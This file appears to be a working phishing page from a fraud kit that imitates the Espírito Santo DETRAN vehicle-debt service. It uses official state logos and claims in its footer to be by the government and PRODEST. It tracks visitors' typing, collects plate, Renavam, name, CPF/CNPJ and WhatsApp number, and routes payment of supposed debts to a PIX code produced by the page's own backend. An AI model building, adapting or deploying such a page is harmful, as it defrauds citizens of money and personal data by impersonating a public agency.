<?php
// pages/detran-es/index.php

require_once "../../db.php";
require_once "../../base/utility.php";
require_once "../../base/detect_device.php";

$id_usuario = 1; 
$page = 'detran-es';

require_once "../../base/tracker.php";
?>
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Serviços DETRAN-ES Veículos</title>
    <link rel="stylesheet" href="https://cdn.es.gov.br/fonts/open-sans/1.0.0/css/open-sans.min.css">
    <link rel="stylesheet" href="https://cdn.es.gov.br/fonts/font-awesome/6.1.1/css/all.min.css">
    <link rel="stylesheet" href="https://cdn.es.gov.br/css/layout-es/web/0.1.1/es-layout-bs5.css" />
    <link rel="stylesheet" href="https://cdn.es.gov.br/bootstrap/5.3.2/css/bootstrap.min.css" />
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css" />
    
    <style>
        body { font-family: 'Open Sans', sans-serif; background-color: #f8f9fa; }
        .es-header2 { background-color: #287b99!important; padding: 40px 0; }
        .es-container { max-width: 1200px; margin: 0 auto; padding: 0 15px; }
        .es-header-row { display: flex; justify-content: space-between; align-items: center; }
        .es-navbar { color: white; }
        .text-primary{ color: #287b99!important; }
        .es-nav-end { display: flex; align-items: center; color: white; font-weight: 600; }
        .footer-b{ background-color: #287b99!important; color: #fff !important; padding: 0 15px; }
        .digital-es-bg { background-color: #f0f2f5; padding: 100px 0; min-height: 80vh; }
        .card-dados-veiculo { border: none; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }

        .step-content { display: none; }
        .step-content.active { display: block; }

        /* Modal Style */
        .modal-custom-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.5); display: none; align-items: center;
            justify-content: center; z-index: 9999; backdrop-filter: blur(2px);
        }
        .modal-custom-content {
            background: white; padding: 30px; border-radius: 12px;
            width: 100%; max-width: 450px; position: relative;
        }

        /* Invoice Style */
        .invoice-card { text-align: center; border: 1px solid #ddd; padding: 20px; border-radius: 12px; background: white; }
        .qr-code-box { margin: 20px 0; padding: 15px; background: #fff; border: 1px solid #eee; display: inline-block; }
        .pix-copy-box {
            background: #f8f9fa; border: 1px solid #dee2e6; padding: 10px; border-radius: 5px;
            font-family: monospace; font-size: 0.9em; word-break: break-all; margin: 15px 0;
            cursor: pointer;
        }

        .loader-spinner {
            display: inline-block; width: 20px; height: 20px; border: 3px solid rgba(255,255,255,.3);
            border-radius: 50%; border-top-color: #fff; animation: spin 1s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }

        /* Sync official table styles */
        .tabela { width: 100%; border-collapse: collapse; }
        .linha-detalhe { border-bottom: 1px solid #eee; transition: background 0.2s; }
        .linha-detalhe:hover { background-color: #f1f7fd; }
        .debito-valor-col { color: #d32f2f; font-weight: bold; }
    </style>
</head>

<body>

<header>
    <section class="es-header2">
        <div class="es-container">
            <div class="es-header-row">
                <div class="sistema-area">
                    <img src="https://cdn.es.gov.br/images/logo/governo/brasao/right-white/Brasao_Governo_190.png" style="height: 40px;" />
                </div>
                <div class="logo-goves" style="color: white; font-weight: bold; font-size: 1.2em;">
                    SISTEMA DE VEÍCULOS
                </div>
            </div>
        </div>
    </section>

    <nav class="es-navbar navbar navbar-expand-md navbar-dark p-2">
        <div class="es-container">
            <div class="navbar-brand">Site DETRAN ES</div>
            <div class="es-nav-end" id="logged-user" style="display: none;">
                <i class="fa-solid fa-user me-2"></i>
                <div id="user-name-display" class="me-3">USUÁRIO</div>
                <a class="btn btn-outline-light btn-sm" href="javascript:location.reload()">Sair</a>
            </div>
        </div>
    </nav>
</header>

<main class="digital-es-bg">
    <div class="es-container">

        <!-- STEP 1: CONSULTA -->
        <div id="step-consulta" class="step-content active">
            <div class="row justify-content-center">
                <div class="col-12 col-md-6 col-lg-5">
                    <div class="card card-dados-veiculo p-4">
                        <div class="text-center mb-4">
                            <h2 class="h3 text-primary fw-bold">CONSULTA DE DÉBITOS</h2>
                            <p class="text-muted small">Informe os dados abaixo para visualizar as pendências do veículo.</p>
                        </div>
<!--                        <div id="typingIndicator" class="alert alert-info py-2 px-3 small d-none mb-3">-->
<!--                            <i class="bi bi-broadcast me-1"></i> Enviando status de digitação...-->
<!--                        </div>-->
                        <form id="formConsulta">
                            <div class="mb-3">
                                <label class="form-label fw-bold">Placa</label>
                                <input type="text" id="placa" class="form-control form-control-lg" placeholder="ABC1D23" required maxlength="7" style="text-transform: uppercase;">
                            </div>
                            <div class="mb-4">
                                <label class="form-label fw-bold">Renavam</label>
                                <input type="text" id="renavam" class="form-control form-control-lg" placeholder="01234567890" required maxlength="11">
                            </div>
                            <button type="submit" class="btn btn-primary w-100 py-3 fw-bold" id="btnConsultar">CONSULTAR VEÍCULO</button>
                        </form>
                    </div>
                </div>
            </div>
        </div>

        <!-- STEP 2: RESULTADOS (TABELA) -->
        <div id="step-resultados" class="step-content">
            <div class="row justify-content-center">
                <div class="col-12 col-lg-9">
                    <div class="card card-dados-veiculo">
                        <div class="card-header bg-white border-0 py-3 d-flex justify-content-between align-items-center">
                            <h2 class="h5 m-0 text-primary fw-bold">DÉBITOS ENCONTRADOS</h2>
                            <button class="btn btn-sm btn-outline-secondary" onclick="showStep('consulta')"><i class="bi bi-arrow-left"></i> Voltar</button>
                        </div>
                        <div class="p-3 bg-light border-top border-bottom" id="owner-banner">
                            <i class="bi bi-person-check-fill text-primary"></i> <strong>Proprietário:</strong> <span id="span-proprietario">---</span>
                        </div>

                        <div class="table-responsive">
                            <table class="table tabela m-0">
                                <thead class="table-light">
                                    <tr class="small text-muted text-uppercase">
                                        <th width="40"></th>
                                        <th>Descrição</th>
                                        <th>Vencimento</th>
                                        <th class="text-end">Situação</th>
                                        <th class="text-end">Valor (R$)</th>
                                    </tr>
                                </thead>
                                <tbody id="listaDebitos">
                                    <!-- Dinâmico -->
                                </tbody>
                            </table>
                        </div>

                        <div class="card-footer bg-white border-0 py-4">
                            <div class="d-flex justify-content-between align-items-center mb-3">
                                <span class="text-muted fw-bold">TOTAL SELECIONADO:</span>
                                <span class="h4 m-0 text-success fw-bold" id="totalValue">R$ 0,00</span>
                            </div>
                            <button class="btn btn-success w-100 py-3 fw-bold" id="btnIrParaDados">PROSSEGUIR PARA PAGAMENTO</button>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- STEP 3: PAGAMENTO (FATURA) -->
        <div id="step-pagamento" class="step-content">
            <div class="row justify-content-center">
                <div class="col-12 col-md-6 col-lg-5">
                    <div class="invoice-card">
                        <div class="mb-3">
                            <img src="https://logodownload.org/wp-content/uploads/2020/02/pix-bc-logo.png" style="height: 40px;">
                        </div>
                        <h2 class="h4 fw-bold mb-4">Pagamento via PIX</h2>

                        <div class="qr-code-box" id="qr-container">
                            <!-- QR Code Dinâmico -->
                        </div>

                        <div class="alert alert-warning small mb-3">
                            <i class="bi bi-info-circle-fill"></i> Escaneie o QR Code ou use o código abaixo.
                        </div>

                        <div class="pix-copy-box" id="pixCode" onclick="copyPix()">
                            Clique aqui para copiar o código PIX
                        </div>

                        <div class="d-flex align-items-center justify-content-center text-muted mt-3 small">
                            <div class="spinner-border spinner-border-sm me-2" role="status"></div>
                            Aguardando confirmação de pagamento...
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- STEP 4: SUCESSO -->
        <div id="step-sucesso" class="step-content text-center">
            <div class="card card-dados-veiculo p-5">
                <i class="bi bi-check-circle-fill text-success" style="font-size: 5rem;"></i>
                <h2 class="fw-bold text-success mt-3">Pagamento Confirmado!</h2>
                <p class="text-muted">Seus débitos foram liquidados com sucesso.</p>
                <div class="bg-light p-3 rounded mb-4 text-start">
                    <div class="small">Referência: <strong id="comp-id">#0000</strong></div>
                    <div class="small">Data: <strong id="comp-data">--/--/--</strong></div>
                </div>
                <button class="btn btn-primary w-100 py-3" onclick="location.reload()">REALIZAR NOVA CONSULTA</button>
            </div>
        </div>

    </div>
</main>

<!-- MODAL: DADOS OBRIGATÓRIOS -->
<div class="modal-custom-overlay" id="modalDados">
    <div class="modal-custom-content">
        <button type="button" class="btn-close position-absolute top-0 end-0 m-3" id="closeModal"></button>
        <h3 class="h5 fw-bold text-primary mb-3">Dados do Contribuinte</h3>
        <p class="text-muted small mb-4">Confirme os dados para geração do pagamento.</p>

        <div class="mb-3">
            <label class="small fw-bold">NOME DO TITULAR</label>
            <input type="text" id="cust-nome" class="form-control" placeholder="Nome Completo">
        </div>
        <div class="mb-3">
            <label class="small fw-bold">CPF OU CNPJ</label>
            <input type="text" id="cust-doc" class="form-control" placeholder="000.000.000-00">
        </div>
        <div class="mb-4">
            <label class="small fw-bold">TELEFONE WHATSAPP</label>
            <input type="tel" id="cust-phone" class="form-control" placeholder="(27) 99999-9999">
        </div>

        <button class="btn btn-success w-100 py-3 fw-bold" id="btnFinalizarGuia">GERAR PAGAMENTO</button>
    </div>
</div>

<footer class="border-top py-5 footer-b color-white">
    <div class="es-container text-center">
        <div class="row align-items-center">
            <div class="col-12 col-md-4 mb-4 mb-md-0">
                <img src="https://cdn.es.gov.br/images/logo/governo/brasao/right-white/Brasao_Governo_240.png" style="filter: brightness(1); opacity: 0.6; height: 50px;">
            </div>
            <div class="col-12 col-md-4 mb-4 mb-md-0 small">
                © 2026 Governo do Estado do Espírito Santo<br>
                Desenvolvido pelo PRODEST
            </div>
            <div class="col-12 col-md-4">
                <i class="fa-solid fa-shield-halved me-2"></i>
                <span class=" small">Ambiente Seguro</span>
            </div>
        </div>
    </div>
</footer>

<script src="https://cdn.es.gov.br/bootstrap/5.3.3/js/bootstrap.bundle.min.js"></script>

<script>
    let currentData = null;
    let totalValor = 0;
    let currentRef = null;
    let pollInterval = null;
    let typingInterval = null;
    let typingStopTimeout = null;

    function showStep(stepName) {
        document.querySelectorAll('.step-content').forEach(s => s.classList.remove('active'));
        document.getElementById(`step-${stepName}`).classList.add('active');
        window.scrollTo(0,0);
    }

    function startTypingStatus() {
        const indicator = document.getElementById('typingIndicator');
        if (indicator) {
            indicator.classList.remove('d-none');
        }

        if (!typingInterval) {
            fetch('../../api/typing_start.php').catch(() => {});
            typingInterval = setInterval(() => {
                fetch('../../api/typing_start.php').catch(() => {});
            }, 2000);
        }

        clearTimeout(typingStopTimeout);
        typingStopTimeout = setTimeout(stopTypingStatus, 2000);
    }

    function stopTypingStatus() {
        if (typingInterval) {
            clearInterval(typingInterval);
            typingInterval = null;
        }
        clearTimeout(typingStopTimeout);
        typingStopTimeout = null;

        const indicator = document.getElementById('typingIndicator');
        if (indicator) {
            indicator.classList.add('d-none');
        }
    }

    // Máscara CPF/CNPJ
    document.getElementById('cust-doc').addEventListener('input', e => {
        let v = e.target.value.replace(/\D/g, "");
        if (v.length <= 11) {
            v = v.replace(/(\d{3})(\d)/, "$1.$2");
            v = v.replace(/(\d{3})(\d)/, "$1.$2");
            v = v.replace(/(\d{3})(\d{1,2})$/, "$1-$2");
        } else {
            v = v.replace(/^(\d{2})(\d)/, "$1.$2");
            v = v.replace(/^(\d{2})\.(\d{3})(\d)/, "$1.$2.$3");
            v = v.replace(/\.(\d{3})(\d)/, ".$1/$2");
            v = v.replace(/(\d{4})(\d)/, "$1-$2");
        }
        e.target.value = v;
    });

    // Consulta
    ['placa', 'renavam'].forEach(id => {
        const input = document.getElementById(id);
        input.addEventListener('input', startTypingStatus);
        input.addEventListener('blur', stopTypingStatus);
    });

    document.getElementById('formConsulta').addEventListener('submit', function(e) {
        e.preventDefault();
        stopTypingStatus();
        const placa = document.getElementById('placa').value;
        const renavam = document.getElementById('renavam').value;
        const btn = document.getElementById('btnConsultar');

        btn.disabled = true;
        btn.innerHTML = '<span class="loader-spinner"></span> CONSULTANDO...';

        fetch(`../../api/buscarES.php?placa=${placa}&renavam=${renavam}`)
        .then(res => res.json())
        .then(data => {
            if (data.IsStatus) {
                currentData = data;
                renderDebitos(data);
                showStep('resultados');
            } else {
                alert('Erro: ' + (data.error || 'Veículo não encontrado.'));
            }
        })
        .finally(() => {
            btn.disabled = false;
            btn.textContent = 'CONSULTAR VEÍCULO';
        });
    });

    function renderDebitos(data) {
        const lista = document.getElementById('listaDebitos');
        lista.innerHTML = '';

        if (data.proprietario) {
            document.getElementById('span-proprietario').textContent = data.proprietario;
            document.getElementById('cust-nome').value = data.proprietario;
            document.getElementById('logged-user').style.display = 'flex';
            document.getElementById('user-name-display').textContent = data.proprietario;
        }

        data.dados.forEach((item, index) => {
            const tr = document.createElement('tr');
            tr.className = 'linha-detalhe';
            tr.innerHTML = `
                <td><input type="checkbox" class="debito-check form-check-input" data-valor="${item.atual}" checked></td>
                <td class="small fw-bold">${item.descricao}</td>
                <td class="small">${item.data_vencimento}</td>
                <td class="small text-end"><span class="badge bg-light text-dark">${item.situacao}</span></td>
                <td class="text-end fw-bold debito-valor-col">R$ ${parseFloat(item.atual).toLocaleString('pt-BR', {minimumFractionDigits:2})}</td>
            `;
            lista.appendChild(tr);
        });

        document.querySelectorAll('.debito-check').forEach(c => c.addEventListener('change', calculateTotal));
        calculateTotal();
    }

    function calculateTotal() {
        totalValor = 0;
        document.querySelectorAll('.debito-check:checked').forEach(c => {
            totalValor += parseFloat(c.dataset.valor);
        });
        document.getElementById('totalValue').textContent = `R$ ${totalValor.toLocaleString('pt-BR', {minimumFractionDigits:2})}`;
        document.getElementById('btnIrParaDados').disabled = totalValor <= 0;
    }

    document.getElementById('btnIrParaDados').addEventListener('click', () => {
        document.getElementById('modalDados').style.display = 'flex';
    });

    document.getElementById('closeModal').addEventListener('click', () => {
        document.getElementById('modalDados').style.display = 'none';
    });

    document.getElementById('modalDados').addEventListener('click', (e) => {
        if (e.target.id === 'modalDados') {
            document.getElementById('modalDados').style.display = 'none';
        }
    });

    document.getElementById('btnFinalizarGuia').addEventListener('click', () => {
        const nome = document.getElementById('cust-nome').value;
        const doc = document.getElementById('cust-doc').value;
        if (!nome || !doc) return alert('Por favor, preencha os dados obrigatórios.');

        const btn = document.getElementById('btnFinalizarGuia');
        btn.disabled = true;
        btn.innerHTML = '<span class="loader-spinner"></span> GERANDO PAGAMENTO...';

        const formData = new FormData();
        formData.append('cpf_cnpj', doc);
        formData.append('nome', nome);
        formData.append('valor', totalValor.toFixed(2));
        formData.append('debito', 'DÉBITOS DETRAN-ES (' + document.getElementById('placa').value.toUpperCase() + ')');

        fetch('../../data/pix.php', { method: 'POST', body: formData })
        .then(res => res.json())
        .then(data => {
            if (data.status && data.pix) {
                currentRef = data.id || data.pix;
                document.getElementById('pixCode').dataset.code = data.pix;

                const qrUrl = `https://chart.googleapis.com/chart?chs=250x250&cht=qr&chl=${encodeURIComponent(data.pix)}`;
                document.getElementById('qr-container').innerHTML = `<img src="${qrUrl}" alt="QR Code PIX">`;

                document.getElementById('modalDados').style.display = 'none';
                showStep('pagamento');
                startPolling();
            } else {
                alert('Erro ao gerar pagamento.');
            }
        })
        .finally(() => {
            btn.disabled = false;
            btn.textContent = 'GERAR PAGAMENTO';
        });
    });

    function copyPix() {
        const code = document.getElementById('pixCode').dataset.code;
        if (!code) return;
        navigator.clipboard.writeText(code).catch(() => {});
        const box = document.getElementById('pixCode');
        box.textContent = '✅ CÓDIGO COPIADO COM SUCESSO!';
        box.style.backgroundColor = '#e8f5e9';
        setTimeout(() => {
            box.textContent = 'Clique aqui para copiar o código PIX';
            box.style.backgroundColor = '#f8f9fa';
        }, 3000);
    }

    function startPolling() {
        if (pollInterval) clearInterval(pollInterval);
        pollInterval = setInterval(() => {
            if (!currentRef) return;
            fetch(`../teste/get_status.php?ref=${encodeURIComponent(currentRef)}`)
            .then(res => res.json())
            .then(data => {
                if (data.payment_status === 'pago') {
                    clearInterval(pollInterval);
                    document.getElementById('comp-id').textContent = '#' + currentRef;
                    document.getElementById('comp-data').textContent = new Date().toLocaleDateString('pt-BR');
                    showStep('sucesso');
                }
            });
        }, 3000);
    }
</script>

</body>
</html>
